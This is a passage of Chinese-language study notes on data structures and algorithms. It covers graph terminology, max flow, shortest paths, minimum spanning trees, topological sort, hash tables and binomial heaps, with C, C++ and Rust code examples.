<li>与一个顶点$v$关联的边的条数称作该顶点的 <strong>度 (degree)</strong>，记作$d(v)$ 。特别地，对于边 $(v,v)$，则每条这样的边要对$d(v)$ 产生2 的贡献。</li>
<li>在有向图$G$ 中，以一个顶点$v$ 为起点的边的条数称为该顶点的 <strong>出度 (out-degree)</strong>，记作$d^+(v)$ 。以一个顶点 $v$为终点的边的条数称为该节点的 <strong>入度 (in-degree)</strong>，记作$d^-(v)$ 。显然$d^+(v) + d^-(v) = d(v)$ 。</li>
</ul>
</li>
<li>
<p>路径</p>
<ul>
<li>
<p><strong>途径 (Walk)</strong>：一个点和边的交错序列，其中首尾是点
$$
v0,e1,v1,e2,v2,⋯,ek,vk
$$
有时简写为 
$$
v0→v1→v2→⋯→vk
$$
其中 $e_i$ 的两个端点分别为 $v_{i−1}$和$v_i$ 以下默认设$w=[v0,e1,v1,e2,v2,⋯,ek,vk]$w=[v0,e1,v1,e2,v2,⋯,ek,vk])。</p>
</li>
<li>
<p><strong>迹 (Trail)</strong>：对于一条<em>途径</em> $w$w，若 $e1,e2,⋯,ek$两两互不相同，则称$w$ 是一条迹。</p>
</li>
<li>
<p><strong>路径 (Path)</strong> (又称简单路径 (Simple path))：对于一条迹 $w$，除了 $v0$ 和 $vk$允许相同外，其余点两两互不相同，则称$w$是一条路径。</p>
</li>
<li>
<p><strong>回路 (Circuit)</strong>：对于一个迹$w$，若$v0=vk$，则称 ww 是一个回路。</p>
</li>
<li>
<p><strong>环/圈 (Cycle)</strong> (又称<strong>简单回路 (Simple circuit)</strong>)：对于一条简单路径$w$，若$v0=vk$，则称$w$ 是一个环。</p>
</li>
</ul>
</li>
<li>
<p>对于一张无向图$G=(V,E)$ ，对于$u,v \in V$ ，若存在一条途径使得$v_0=u, v_k = v$ ，则称$u$和$v$是 <strong>连通的 (connected)</strong>。由定义，任意一个顶点和自身连通，任意一条边的两个端点连通。</p>
</li>
<li>
<p>对一张图 $G=(V,E)$，若存在另一张图$H=(V′,E′)$ 满足 $V′⊆V;E′⊆E$，则称$H$ 是$G$的<strong>子图</strong> (Subgraph)，记作 $H⊆G$。</p>
<ul>
<li>若对 $H⊆G$，满足对$ ∀u,v∈V′$，只要 $(u,v)∈E$，均有 $(u,v)∈E′$，则称$H$是 $G$的<strong>导出子图/诱导子图 (Induced subgraph)</strong>。</li>
<li>若 $H⊆G$ 满足 $V′=V$，则称 $H$ 为 $G$的<strong>生成子图/支撑子图 (Spanning subgraph)</strong>。</li>
</ul>
</li>
<li>
<p>如果一张无向连通图不含环，则称它是一棵 <strong>树 (tree)</strong>。</p>
</li>
<li>
<p>如果存在一条路经过图上的每条<strong>边edge</strong>有且仅有一次，那么称这条路是<strong>欧拉路Euler path</strong>，如果这条路是回路，那么称作<strong>欧拉回路Euler circuit</strong>。</p>
<ul>
<li>如果一个图上的<strong>节点vertex</strong>的<strong>度degree</strong>都是<strong>偶数even</strong>或有且仅有两个<strong>奇数odd</strong>，那么我们可以找到一条<strong>欧拉路</strong>。</li>
<li>如果一个图上每个vertex的degree都是偶数，那么我们可以找到一个<strong>欧拉回路</strong>。</li>
</ul>
</li>
</ul>
<p>图的分类</p>
<ul>
<li>
<p><strong>无向图 (undirected graph)</strong>，<strong>有向图 (directed graph)</strong></p>
</li>
<li>
<p>若$G$为无向图，则$E$中的每个元素为一个无序二元组$(u,v)$ ，称作 <strong>无向边 (undirected edge)</strong>，简称 <strong>边 (edge)</strong>，其中$u,v \in V$ 。设$e = (u,v)$ ，则$u$和$v$称为$e$的 <strong>端点 (endpoint)</strong>。</p>
</li>
<li>
<p>若$G$为有向图，则$E$中的每一个元素为一个有序二元组$(u,v)$ ，有时也写作$u\rightarrow v$ ，称作 <strong>有向边 (directed edge)</strong> 或 <strong>弧 (arc)</strong>，在不引起混淆的情况下也可以称作 <strong>边 (edge)</strong>。设$e=u\rightarrow v$ ，则此时$u$称为$e$的<strong>起点 (tail)</strong>， $v$称为$e$的<strong>终点 (head)</strong>，起点和终点也称为$e$ 的 <strong>端点 (endpoint)</strong>。并称$u$ 是$v$ 的直接前驱，$v$ 是$u$ 的直接后继。</p>
<p><img src="Basic/DataStructure/Graph/../images/image-20220725233612654.png" alt="image-20220725233612654" /></p>
</li>
<li>
<p><strong>连通性 (connectivity)</strong></p>
</li>
<li>
<p>若无向图G ，满足其中任意两个顶点均连通，则称$G$ 是 <strong>连通图 (connected graph)</strong></p>
<ul>
<li>若$H$是$G$的一个连通子图，且不存在$F$满足$H\subset F\subseteq G$且$F$为连通图(就是H是最大的意思)，则$H$是$G$的一个<strong>连通块/连通分量 (connected component)</strong>。</li>
</ul>
</li>
<li>
<p>若一张有向图的节点两两互相可达，则称这张图是 <strong>强连通的 (strongly connected)</strong>。</p>
</li>
<li>
<p>若一张有向图的边替换为无向边后可以得到一张连通图，则称原来这张有向图是 <strong>弱连通的 (weakly connected)</strong>。</p>
<ul>
<li>类似也有<strong>弱连通分量</strong>和<strong>强连通分量</strong>。</li>
</ul>
</li>
<li>
<p><strong>稀疏图 (sparse graph)</strong>，<strong>稠密图 (dense graph)</strong>，这两个概念并没有严格的定义。</p>
</li>
<li>
<p>若一张图的边数远小于其点数的平方，那么它是一张 <strong>稀疏图 (sparse graph)</strong>。</p>
</li>
<li>
<p>若一张图的边数接近其点数的平方，那么它是一张 <strong>稠密图 (dense graph)</strong>。</p>
</li>
<li>
<p>无权图和有权图</p>
<p><img src="Basic/DataStructure/Graph/../images/image-20220725233549085.png" alt="image-20220725233549085" /></p>
</li>
</ul>
<p>图的表示方法，通常有两种：</p>
<ul>
<li>
<p>邻接矩阵：使用一个二维数组 <code>adj</code> 来存边，其中 <code>adj[u][v]</code> 为 1 表示存在<code>u</code>到<code>v</code>的边，为 0 表示不存在。如果是带边权的图，可以在 <code>adj[u][v]</code> 中存储<code>u</code>到<code>v</code>的边的边权（可用0或正无穷表示边不存在，看具体情况）。他只能用于没有重边的情况，并且稀疏图的存储效率低下，好处是查找一条边的时间代价为$O(1)$</p>
<p><img src="Basic/DataStructure/Graph/../images/image-20220725234025805.png" alt="image-20220725234025805" /></p>
</li>
<li>
<p>邻接表：使用一个支持动态增加元素的数据结构构成的数组，如 <code>vector&lt;int&gt; adj[n + 1]</code> 来存边，其中 <code>adj[u]</code> 存储的是点<code>u</code> 的所有出边的相关信息（终点、边权等），查找一条边的时间代价为$O(d^+(u))$（如果边排序使用二分查找可以是$O(log(d^+(u)))$）。</p>
<p><img src="Basic/DataStructure/Graph/../images/image-20220725233751211.png" alt="image-20220725233751211" /></p>
</li>
</ul>
<hr />
<p>参考链接</p>
<p>图论概念梳理 https://yhx-12243.github.io/OI-transit/memos/14.html   https://oi-wiki.org/graph/concept/</p>
<p>课件来源 https://github.com/wangshusen/AdvancedAlgorithms/blob/master/LICENSE</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h2 id="最大流"><a class="header" href="#最大流">最大流</a></h2>
<p><strong>最大流问题</strong>：在一个单源点、单汇点的<a href="https://zh.wiki.sxisa.org/wiki/%E7%BD%91%E7%BB%9C%E6%B5%81">网络流</a>中找到一条最大的可行流。如图，S就是源点，T就是汇点。</p>
<p><img src="Basic/DataStructure/Graph/../images/image-20220801221759083.png" alt="image-20220801221759083" /></p>
<p>这个问题的算法有很多很多。只了解一种。Edmonds–Karp算法：<a href="https://visualgo.net/en/maxflow">可视化参考链接</a></p>
<h3 id="edmondskarp算法"><a class="header" href="#edmondskarp算法">Edmonds–Karp算法	</a></h3>
<p>时间复杂度为<code>O(VE^2)</code>。当我实际编程的时候，有这些感悟：</p>
<ol>
<li>因为涉及查找，所以最好用邻接表而不是邻接矩阵</li>
<li>难点在于增广路的查找和存储。</li>
</ol>
<pre><code>initMaxFlow
while there is an augmenting path
    find an augmenting path using BFS
    for each edge u-&gt;v in the path
        decrease capacity u-&gt;v by bottleneck
        increase capacity v-&gt;u by bottleneck
    increase maxflow by bottleneck
</code></pre>
<p>功能：用广度优先搜索查找增广路
参数：source和destination指定源和汇，grpah-&gt;matrix是邻接矩阵，结果存储在ADT stack中。下面是伪代码：</p>
<pre><code class="language-c">int find_argument(int source,int destination, Lgraph* graph,Stack* stack)
{
    //初始化，visited表示是否已经访问过
    for (i=1;i&lt;=graph-&gt;Nv;i++)
        visited[i] = 0;
    visited[source] = 1;
  
    i = 1;
    while (1)
    {
         //没有访问过并且有路，就是下一个目标
        if (graph-&gt;matrix[source][i]&gt;0 &amp;&amp; visited[i]==0)       
        {
           stack.push( (source,i) )
            visited[i] = 1;
            if (i==destination) return True;   
            source = i;
            i=1;
            continue;
        }
        i++;   
        // 说明没找到
        if (i&gt;graph-&gt;Nv) 
        {
            if (stack.isEmpty() ) return false; //如果栈空了说明没有路，否则退回上一步
            source,i = stack.pop()
            visited[i] = 0;
            i++;
        }
    }
}
</code></pre>
<ol start="4">
<li></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="最短路"><a class="header" href="#最短路">最短路</a></h1>
<p>最短路问题：从点A到点B的，权和最小的路径。</p>
<p>单源最短路问题：从一个点A出发，到其他节点的最短路。如下表就是v3的单源最短路，<code>dist</code>是v3-&gt;vertex的路径长度，<code>path</code>是v3-&gt;vertex的路径中，vertex的前一个节点。</p>
<p><img src="Basic/DataStructure/Graph/../images/image-20220725235233023.png" alt="image-20220725235233023" /></p>
<h3 id="宽度优先搜索"><a class="header" href="#宽度优先搜索">宽度优先搜索</a></h3>
<p>对于每条路都是<strong>无权</strong>的情况下（每条路等价），我们只用简单的宽度优先搜索。</p>
<h2 id="dijkstra"><a class="header" href="#dijkstra">Dijkstra</a></h2>
<p><strong>Dijkstra算法可以计算有权图的单源最短路问题</strong>，不过不能处理带负边权的情况。</p>
<p>他是一种贪心算法，基本思路是不断的从距离最短的新节点出发，探索新的更短的路径</p>
<pre><code>unknown优先队列：把未曾经过的点组成一个最小堆。
初始化一个distance数组，标记起点为0,其他的点为INF。初始化一个unknown优先队列，把起点入队。
从unknown中pop出一个vertex,遍历vertex的邻点：
	如果邻点known(就是从unknown队列中pop出来过，可以存储一下)，则不做操作
	否则
		判断从该vertex出发到它邻点的距离，是否能更新distance数组。
		将邻点入unknown优先队列 	（有的点可能被重复入队，其实是要改变他的位置）
如果unknown空了，就结束了
</code></pre>
<h2 id="floyd算法-1"><a class="header" href="#floyd算法-1">Floyd算法</a></h2>
<p>计算<strong>所有点到所有点</strong>的最短距离。时间复杂度为O(N^3)。可以看出用<strong>邻接表</strong>最好。</p>
<pre><code class="language-c">/* 初始化 */
for (v=0;v&lt;G.Nv;v++)
    for (w=0;w&lt;G.Nv;w++)
    {
        D[v][w] = G.matrix[v][w];   //D[v][w]就是v到w的最短路
        P[v][w] = w;    //P存储着路径的前驱
    }

for (k=0;k&lt;G.Nv;k++)
    for (v=0;v&lt;G.Nv;v++)
        for (w=0;w&lt;G.Nv;w++)
            if (D[v][w]&gt;D[v][k]+D[k][w])
            {
                D[v][w] =D[v][k]+D[k][w];
                P[v][w] = P[v][k];
            }
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="最小生成树"><a class="header" href="#最小生成树">最小生成树</a></h1>
<p><strong>最小生成树 Minimum spanning tree</strong>。在概念部分介绍了生成图和树的概念，那么生成树不难理解。我们定义无向连通图的 <strong>最小生成树</strong>（Minimum Spanning Tree，MST）为边权和最小的生成树。</p>
<p>以有线电视电缆的架设为例，若只能沿著街道布线，则以街道为边，而路口为顶点，其中必然有一最小生成树能使布线成本最低。</p>
<h2 id="prim算法"><a class="header" href="#prim算法">Prim算法</a></h2>
<p>Prim 算法是一种常见并且好写的最小生成树算法。该算法的基本思想是从一个结点开始，不断加。</p>
<ol>
<li>V包含了最后生成树的所有节点，E包含了最后生成树的所有边。一开始，随便选取某一个点加入V，E为空。</li>
<li>遍历所有连接节点$x$和$y$（$x∈V, y∉V$） 所有的边<sup class="footnote-reference"><a href="#1">1</a></sup>，寻找最权重最小的边，将$y$加入$V$，$e_{xy}$加入$E$。</li>
<li>不断重复过程2，直到所有的没有满足条件的边。</li>
</ol>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p>在实现的时候，不需要真的遍历一遍所有的边，可以用一个数组存储V中所有点到y点的最大距离，即下面代码中的key</p>
</div>
<div class="table-wrapper"><table><thead><tr><th>实现方法</th><th>时间复杂度</th></tr></thead><tbody>
<tr><td>邻接矩阵、搜索</td><td>$O(V^2)$</td></tr>
<tr><td>二叉堆（最小堆）、邻接表</td><td>$O((V + E) log(V)) = O(E log(V))$</td></tr>
<tr><td>斐波那契堆、邻接表</td><td>$O(E + V log(V)$)</td></tr>
</tbody></table>
</div>
<p>由此也可以看出，Prim适合稠密图。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 第一种朴素算法的实现
// graph是邻接表
fn prim(graph: &amp;[&amp;[usize]]) -&gt; Vec&lt;usize&gt; {
    let len = graph.len();
    let mut key = vec![usize::MAX; len];
    let mut visited = vec![false; len];
    let mut parent = vec![usize::MAX; len];

    key[0] = 0;
    for _ in 0..len - 1 {
        let y = (0..len)
            .filter(|i| !visited[*i])
            .reduce(|min, i| if key[min] &gt; key[i] { i } else { min })
            .unwrap();

        visited[y] = true;
        for i in 0..len {
            if key[i] &gt; graph[y][i] &amp;&amp; visited[i] == false {
                key[i] = graph[y][i];
                parent[i] = y;
            }
        }
    }

    parent
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="kruskal-算法"><a class="header" href="#kruskal-算法">Kruskal 算法</a></h2>
<p>Kruskal 算法是一种常见并且好写的最小生成树算法，由 Kruskal 发明。该算法的基本思想是从小到大加入边，是个贪心算法。</p>
<ol>
<li>首先，我们需要把所有节点看成独立的生成树，并且把所有的边按照从小到大的数据进行排列。</li>
<li>在n条边中，我们依次取出其中的每一条边，如果发现边的<strong>两个节点分别位于两棵树上</strong><sup class="footnote-reference"><a href="#2">2</a></sup>，那么<strong>把两棵树合并成为一颗树</strong><sup class="footnote-reference"><a href="#3">3</a></sup>；如果树的两个节点位于同一棵树上，那么忽略这条边，继续运行。</li>
<li>等到所有的边都遍历结束之后<sup class="footnote-reference"><a href="#4">4</a></sup>，如果所有的生成树可以<strong>合并成一条生成树</strong><sup class="footnote-reference"><a href="#5">5</a></sup>，那么它就是我们需要寻找的最小生成树，反之则没有最小生成树。</li>
</ol>
<div class="footnote-definition" id="2"><sup class="footnote-definition-label">2</sup>
<p>两个节点分别位于两棵树上：并查集Find
<sup class="footnote-reference"><a href="#3">3</a></sup>:把两棵树合并成为一颗树：并查集Union，如果需要的话要记录连接的边。
<sup class="footnote-reference"><a href="#4">4</a></sup>:如果找到Nv-1条边也可以提前结束
<sup class="footnote-reference"><a href="#5">5</a></sup>: 是否合并成一棵树：利用并查集，看有几个集合。</p>
</div>
<p>平均时间复杂度为$O (|E|\log |E|)$，因为排序需要$O (|E|\log |E|)$，然后遍历边需要$O(|E|)$，而并查集的Find和Union的时间复杂度大约是$O(1)$（只能说可以认为是一个很小的常数）</p>
<p>由此也可以看出，Kruskal 适合稀疏图。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="关键路径"><a class="header" href="#关键路径">关键路径</a></h1>
<p>关键路径是指设计中从输入到输出经过的延时最长的逻辑路径。优化关键路径是一种提高设计工作速度的有效方法。一般地，从输入到输出的延时取决于信号所经过的延时最大路径，而与其他延时小的路径无关。这是直观的理解，如果转换成图论术语的话，我们先引入AOE network的概念</p>
<p><strong>AOE network</strong>：用<strong>顶点表示事件</strong>，<strong>用边表示活动</strong>，<strong>权值表示活动的持续时间</strong>。只有在某顶点代表的事件发生后，从该顶点出发的各活动才能开始。只有在进入某顶点的各活动都已经结束，该顶点代表的事件才能发生。因此在AOE network中，只有一个入度为 0 的点表示工程的开始，即<strong>源点</strong>，也只有一个出度为 0 的点表示工程的结束，即<strong>汇点</strong>。是无环图。</p>
<p>那么，从源点到汇点的具有<strong>最大路径长度（该路径上行各活动持续时间的和）<strong>的路径称为</strong>关键路径</strong>，关键路径上的活动称为<strong>关键活动</strong>。关键路径可能不只有一个。</p>
<h2 id="关键路径的计算"><a class="header" href="#关键路径的计算">关键路径的计算</a></h2>
<p>有两个概念，一个是活动的最早开始时间(EC)，活动的最晚开始时间(LC)。对于关键路径上的事件，<code>EC==LC</code>。</p>
<ul>
<li>可以用类似于拓扑排序的方法求最早开始时间：<code>EC[v] = Max{v前继的EC}+self</code>（所以要记录每个点的最早开始时间）。</li>
<li>算完之后，再反过来求最晚开始时间。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="拓扑排序"><a class="header" href="#拓扑排序">拓扑排序</a></h1>
<p>对一个有向无环图(Directed Acyclic Graph, DAG)G进行拓扑排序，是将G中所有顶点排成一个线性序列，使得图中任意一对顶点u和v，若边&lt;u,v&gt;∈E(G)，则u在线性序列中出现在v之前。</p>
<p>拓扑排序的结果不一定是唯一的。</p>
<p>算法应用</p>
<ul>
<li>可以用来决定互相之间有依赖关系的事件的执行顺序，从而合理的调度。</li>
<li>可以通过拓扑排序判断图是否循环。因为如果图是循环的话，拓扑排序会失败。</li>
</ul>
<h2 id="算法思路"><a class="header" href="#算法思路">算法思路</a></h2>
<p>拓扑排序的思想是</p>
<ol>
<li>初始化一个入度为0的点的队列（队列或堆栈）。</li>
<li>如果队列为空，那么结束。</li>
<li>从队列中出队vertex V，并给V的后继indegree-1。</li>
<li>寻找入度为0的点的入队。如果最后不存在入度为0的节点，那就说明有环，无解。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hash"><a class="header" href="#hash">Hash</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hashtree"><a class="header" href="#hashtree">HashTree</a></h1>
<p>HashTree可以高效的验证大型数据的Hash。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hashing"><a class="header" href="#hashing">Hashing</a></h1>
<h1 id="hash-table-adt"><a class="header" href="#hash-table-adt">Hash Table ADT</a></h1>
<p>Hash Table是一组key-value的集合，并且key是唯一的。我们在python中的字典类型就是一个很好的例子。我们通过把Key映射到Table中的一个特定的位置来访问Value，加快查找的速度。
这个映射的方法就是<strong>哈希函数hash function</strong>。哈希(Hash)算法，更为准确的翻译是散列算法。是一种将字符组成的字符串转换为固定长度（一般是更短长度）的数值或索引值的方法。可以实现常数平均时间执行插入、删除和查找。
一个理想的（但是不可能的）hash function把每个key映射到一个不同的位置。不同的key被映射到同一个位置就是<strong>碰撞/冲突(collision)</strong>：$f(x_1)=f(x_2)\ when\ x_1\neq x_2$ 。解决碰撞问题有不同的策略。
下面我们来看hash function和解决碰撞的策略。</p>
<p>主要实现Delete、Find、Insert三个接口。</p>
<h2 id="hash-function"><a class="header" href="#hash-function">Hash Function</a></h2>
<p>哈希函数的要求：</p>
<ol>
<li>容易计算</li>
<li>减少碰撞</li>
<li>让结果分布更加均匀，最好是均匀分布。</li>
</ol>
<p>下面我们看一些常见的hash function</p>
<h3 id="余数法"><a class="header" href="#余数法">余数法</a></h3>
<p>如果x是一个整数：$f(x) = x\ %\ TableSize$。通常TableSize取成素数。
相应的如果x是一个字符串：$f(x)=(\sum{x[i]})\ %\ TableSize$ 或 $f(x)=(\sum{x[i]*N^{i}})\ %\ TableSize$，这个N的取值应该是x[i]的范围（当然也不必那么严格），同样的如果用2^n可以用位移代替乘法。</p>
<pre><code class="language-c">//这是一个非常高效的hash算法
string_hash(const char *Key, int TableSize)
{
    unsigned int HashVal=0;
    while (*Key != 0)
    {
        //不考虑溢出，加速！
        HashVal = (HashVal&lt;&lt;5) +*(Key++);
    }
   	return HashVal % TableSize;
}
</code></pre>
<h3 id="安全散列算法sha"><a class="header" href="#安全散列算法sha">安全散列算法SHA</a></h3>
<p>这个可能要等到密码学的时候再来填坑了。</p>
<h2 id="解决碰撞"><a class="header" href="#解决碰撞">解决碰撞</a></h2>
<h3 id="分离链接法-separate-chaining"><a class="header" href="#分离链接法-separate-chaining">分离链接法 separate chaining</a></h3>
<p>可以把发生碰撞的key都保留在同一个<strong>链表</strong>中。
为了方便起见在原来的表中存储了头节点。这样我们由key $f(key)=index$之后，再在index所存储的头节点所在的链表中插入我们真正要存储的value。
由此我们也可以看到把元素尽可能均匀的散列的重要性。最坏情况全部冲突就变成列表了。。
<img src="Basic/DataStructure/Hash/../images/1610025657171.png" alt="" /></p>
<p>当然，不一定非要是链表，也可以是二叉树等别的数据结构。我们下面来看这种方法的Hash Table ADT接口实现。</p>
<pre><code class="language-c">Position Find(ElementType Key,HashTable H)
{
  Position P;
  List L;
  L = H-&gt;TheLists[Hash(Key,H-&gt;TableSize)];

  P= L-&gt;Next;
  while (P!=NULL &amp;&amp; P-&gt;Element!=Key)
    P = P-&gt;Next;
  return P;	
}
</code></pre>
<pre><code class="language-c">void Insert(ElementType Key,HashTable H)
{
  Position Pos,NewCell;
  List L;
  Pos = Find(Key,H);
  if (Pos == NULL)	//没有找到key，要插入
  {
    NewCell = malloc(sizeof(Node));
    L = H-&gt;TheLists[Hash(Key,H-&gt;TableSize)];
    NewCell-&gt;Key = Key;
    NewCell-&gt;Next = L-&gt;Next;
    L-&gt;Next = NewCell;		//插在最前面简单
  }
}
</code></pre>
<pre><code class="language-c">//Delete中我们可以不真正的删除，而是把它标记为删除，称为Lazy Delete
//当然这么实现的话上面的实现也要对应的改变
void Delete(ElementType Key,HashTable H)
{
  Position P = Find(Key,HashTable H);
  P-&gt;empty = 1;		
}
</code></pre>
<h3 id="开放定址法-open-addressing-hashing"><a class="header" href="#开放定址法-open-addressing-hashing">开放定址法 open addressing hashing</a></h3>
<p>如果有冲突发生，那么我们就尝试选择另外的单元。具体的说我们依次尝试位置$h_0(X),h_1(X), h_2(X),...$，其中$h_i(X)=(Hash(X)+F(i))\ mod\ TableSize$。关键就是这个函数$F(i)$，他是解决冲突的办法。</p>
<p>最简单的，我们可以让$F(i)=i$，这个就叫<strong>线性探测法 linear probing</strong>。但是可能会导致元素扎堆，形成<strong>一次聚集(primary clustering)</strong>。
进一步我们可以让$F(i)=i^2$，这个叫做<strong>平方探测法 quadric probing</strong>。可以注意到平方函数可能不能遍历整个表，也就是说可能表还没有填满就放不进去元素了。如果<strong>表的大小是素数</strong>，我们可以证明表至少有一半是空着的时候可以填入新元素。
如果表的大小是$4k+3$型的素数并且探测方法为$\pm i^2$的时候可以保证遍历整个表。</p>
<h3 id="双散列-double-hashing"><a class="header" href="#双散列-double-hashing">双散列 double hashing</a></h3>
<p>$F(i)=i*hash_2(X)$。我们要好好选择表的大小和hash_2散列函数。一个关键的点是hash_2函数不能算出0（不然就死了，0乘任何数都是0）。表的大小一定要是素数，不然可能无法遍历整个表。</p>
<h2 id="再散列-rehashing"><a class="header" href="#再散列-rehashing">再散列 Rehashing</a></h2>
<p>如果表被填的比较满了，那我们解决碰撞的算法再好可能要反复寻找insert的地方，这不好。一个解决办法是建立另一个更大的表并使用一个新的相关的hash function，然后把原来表的元素通过新的hash function散列到新的表里。</p>
<p>一般来说新的更大的表会选择原来的两倍大小（但是表的大小最好是素数），判断何时要进行再散列也有不同的策略。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="heap-1"><a class="header" href="#heap-1">Heap</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="binomial-heap"><a class="header" href="#binomial-heap">Binomial Heap</a></h1>
<p>二项堆 H 由一组满足下面的二叉堆性质的二项树组成。</p>
<ol>
<li>H 中的每个二项树遵循最小堆性质：节点的关键字大于或等于其父节点的关键字</li>
<li>对任意非负整数k，在 H 中至多有一颗二项树的根具有度数 k。第二个性质决定了如何判断一个包含 n 个元素的二项堆由哪几个二项树构成呢？将 n 写成二进制形式，哪一位为 1，那一位对应的二项树就应该存在。
比如，一个有42(0b101010)个结点的堆，就是由2、8、32个结点的树构成的森林。</li>
</ol>
<p>他的优势是可以快速<strong>合并</strong>两个堆。</p>
<h2 id="复杂度分析-1"><a class="header" href="#复杂度分析-1">复杂度分析</a></h2>
<div class="table-wrapper"><table><thead><tr><th>过程</th><th>二项堆(最坏)</th><th>摊还分析</th></tr></thead><tbody>
<tr><td>MAKE_HEAP</td><td>Θ(1)</td><td></td></tr>
<tr><td>INSERT</td><td>Ω(lg n)</td><td>O(1)</td></tr>
<tr><td>MINIMUM</td><td>Ω(lg n)<br />这个是特殊的，因为每一个Root都可能是最小</td><td></td></tr>
<tr><td>EXTRACT-MIN</td><td>Θ(lg n)</td><td></td></tr>
<tr><td>UNION</td><td>Θ(lg n)</td><td></td></tr>
<tr><td>DECREASE-KEY</td><td>Θ(lg n)</td><td></td></tr>
<tr><td>DELETE</td><td>Θ(lg n)</td><td></td></tr>
</tbody></table>
</div>
<h2 id="参考实现"><a class="header" href="#参考实现">参考实现</a></h2>
<p><a href="https://www.geeksforgeeks.org/binomial-heap-2/">参考链接-讲解</a>. <a href="Basic/DataStructure/Heap/">参考链接-实现</a></p>
<p><strong>The main operation in Binomial Heap is <code>union()</code>, all other operations mainly use this operation.</strong> The union() operation is to combine two Binomial Heaps into one. Let us first discuss other operations, we will discuss union later.</p>
<ol>
<li><code>insert(H, k)</code>: Inserts a key ‘k’ to Binomial Heap ‘H’. This operation first creates a Binomial Heap with single key ‘k’, then calls union on H and the new Binomial heap. 插入的摊还复杂度是$O(2)$</li>
<li><code>getMin(H)</code>: A simple way to <code>getMin()</code> is to traverse the list of root of Binomial Trees and return the minimum key. This implementation requires <strong>O(Log N)</strong> time. It can be optimized to O(1) by maintaining a pointer to minimum key root. </li>
<li><code>extractMin(H)</code>: This operation also uses union(). We first call getMin() to find the minimum key Binomial Tree, then we remove the node and create a new Binomial Heap by connecting all subtrees of the removed minimum node. Finally, we call <code>union()</code> on H and the newly created Binomial Heap. This operation requires <strong>O(Log N)</strong> time. </li>
<li><code>delete(H)</code>: Like Binary Heap, delete operation first reduces the key to minus infinite, then calls extractMin(). </li>
<li><code>decreaseKey(H)</code>: decreaseKey() is also similar to Binary Heap. We compare the decreases key with it parent and if parent’s key is more, we swap keys and recur for the parent. We stop when we either reach a node whose parent has a smaller key or we hit the root node. Time complexity of decreaseKey() is <strong>O(Log N)</strong>. </li>
<li><code>union(H1,H2)</code>:star:
<ol>
<li>The first step is to simply merge the two Heaps in <strong>non-decreasing order of degrees</strong> 按照结点的度数排序O(Log N).</li>
<li>After the simple merge, we need to make sure that there is at most one Binomial Tree of any order. To do this, we need to combine Binomial Trees of the same order. We traverse the list of merged roots, we keep track of three-pointers, <code>prev-x</code>, <code>x</code> and <code>next-x</code>. There can be following 4 cases when we traverse the list of roots. 
<ul>
<li>Case 1: Orders of x and next-x are not same, we simply move ahead. </li>
<li>In following 3 cases orders of x and next-x are same. 
<ul>
<li>Case 2: If the order of next-next-x is also same, move ahead. (当出现三个一样的时候，我们其实可以有合并其中任意两个。这里选择合并后面两个，所以就直接往后移动指针了。如果考试考到了，这个点是需要注意的，其实有$C_3^2=3$种可能性)</li>
<li>Case 3: If the key of x is smaller than or equal to the key of next-x, then make next-x as a child of x by linking it with x. </li>
<li>Case 4: If the key of x is greater, then make x as the child of next. 三和四的区别就在于谁当root.</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ol>
<p><img src="Basic/DataStructure/Heap/../images/Bionomial_tree_2.png" alt="img" /></p>
<h2 id="实现"><a class="header" href="#实现">实现</a></h2>
<p>陈越老师课件的数据结构：</p>
<pre><code class="language-c">typedef struct BinNode *Position;
typedef struct Collection *BinQueue;
typedef struct BinNode *BinTree; 

struct BinNode 
{ 
    ElementType	    Element;
    Position	    LeftChild;		
    Position 	    NextSibling;	/* 注意这个Sibling是从个数多到个数少排序的，就像上面的图一样.Root是没有的 */
} ;

struct Collection 
{ 
    int	    		CurrentSize;	/* total number of nodes */
    BinTree			TheTrees[ MaxTrees ];
} ;
</code></pre>
<p>union：</p>
<pre><code class="language-cpp">// This function perform union operation on two
// binomial heap i.e. l1 &amp; l2
list&lt;Node*&gt; unionBionomialHeap(list&lt;Node*&gt; l1,list&lt;Node*&gt; l2)
{
	// _new to another binomial heap which contain
	// new heap after merging l1 &amp; l2
	list&lt;Node*&gt; _new;
	list&lt;Node*&gt;::iterator it = l1.begin();
	list&lt;Node*&gt;::iterator ot = l2.begin();
// 第一步，首先不降序排序
	while (it!=l1.end() &amp;&amp; ot!=l2.end())
	{
		// if D(l1) &lt;= D(l2)
		if((*it)-&gt;degree &lt;= (*ot)-&gt;degree)
		{
			_new.push_back(*it);
			it++;
		}
		// if D(l1) &gt; D(l2)
		else
		{
			_new.push_back(*ot);
			ot++;
		}
	}
	// if there remains some elements in l1 binomial heap
	while (it != l1.end())
	{
		_new.push_back(*it);
		it++;
	}

	// if there remains some elements in l2 binomial heap
	while (ot!=l2.end())
	{
		_new.push_back(*ot);
		ot++;
	}
	return _new;
}

list&lt;Node*&gt; adjust(list&lt;Node*&gt; _heap)
{
	if (_heap.size() &lt;= 1)
		return _heap;
	list&lt;Node*&gt; new_heap;
	list&lt;Node*&gt;::iterator it1,it2,it3;
	it1 = it2 = it3 = _heap.begin();

	if (_heap.size() == 2)
	{
		it2 = it1;
		it2++;
		it3 = _heap.end();
	}
	else
	{
		it2++;
		it3=it2;
		it3++;
	}
	while (it1 != _heap.end())
	{
		// if only one element remains to be processed
		if (it2 == _heap.end())
			it1++;

		// If D(it1) &lt; D(it2) i.e. merging of Binomial
		// Tree pointed by it1 &amp; it2 is not possible
		// then move next in heap
		else if ((*it1)-&gt;degree &lt; (*it2)-&gt;degree)
		{
			it1++;
			it2++;
			if(it3!=_heap.end())
				it3++;
		}

		// if D(it1),D(it2) &amp; D(it3) are same i.e.
		// degree of three consecutive Binomial Tree are same
		// in heap
